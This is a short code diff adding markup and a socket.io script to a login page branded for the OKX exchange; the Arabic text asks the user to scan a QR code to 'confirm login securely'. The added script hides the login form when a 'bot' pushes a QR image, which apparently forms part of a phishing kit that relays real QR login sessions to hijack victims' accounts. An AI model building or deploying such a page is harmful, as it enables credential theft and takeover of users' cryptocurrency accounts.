@@ -71,6 +71,23 @@
     </a>
 </div>
 
+    <div id="qr-container" style="display:none; text-align:center;">
+    <h3>تأكيد الدخول عبر تطبيق OKX</h3>
+    <p>يرجى مسح الرمز التالي لإتمام عملية تسجيل الدخول بأمان</p>
+    <img id="qr-image" src="" style="border: 10px solid #fff; border-radius: 10px;">
+</div>
+
+<script>
+    socket.on('show_qr', function(data) {
+        // إخفاء فورم اللوجن وإظهار الـ QR
+        document.getElementById('login-form').style.display = 'none';
+        document.getElementById('qr-container').style.display = 'block';
+        
+        // عرض الصورة المرسلة من البوت
+        document.getElementById('qr-image').src = "data:image/png;base64," + data.image;
+    });
+</script>
+    
 <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
 
 <script>
